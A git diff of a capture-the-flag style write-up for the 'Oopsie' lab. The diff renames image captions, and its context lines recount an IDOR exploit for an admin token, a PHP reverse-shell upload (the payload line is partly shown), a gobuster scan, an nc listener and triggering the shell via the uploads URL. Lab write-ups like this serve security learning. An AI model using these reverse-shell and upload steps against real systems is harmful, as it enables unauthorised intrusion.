@@ -19,7 +19,7 @@ Initiate recon by **nmap** command:
   
 After inspect the home page source code, we found an url that is use to login. Next we can login as guest.
   
-  ![homepage|446](/assets/img/Oopsie/inspect_homepage.png)
+  ![sourecode|446](/assets/img/Oopsie/inspect_homepage.png)
 
 ## **Exploitation**
 There is an IDOR vunerbility on web browser url that enable us to access admin's access token and username. 
@@ -35,17 +35,17 @@ Here is my PHP reverse shell that i use : ```<?php system("bash -c 'bash -i >& /
 
 Can't find any subdirectory of "upload" so I use **gobuster** :
 
-![Nmap Scan Result|601](/assets/img/Oopsie/gobuster.png)
+![gobuster|601](/assets/img/Oopsie/gobuster.png)
 
 and that actually found an exact url to uploaded folder. 
 
 
 After that i prepare my **listener** : ```nc -lvnp 4444```.
 
-![Nmap Scan Result|343](/assets/img/Oopsie/listener.png)
+![listener](/assets/img/Oopsie/listener.png)
 
 To get a reverse shell i have to go to this exact url "https://10.129.95.191/uploads/shell.php".
 
 The moment I executed all of these step, finally got an reverse shell.
 
-![Nmap Scan Result|601](/assets/img/Oopsie/foothold.png)
+![foothold](/assets/img/Oopsie/foothold.png)
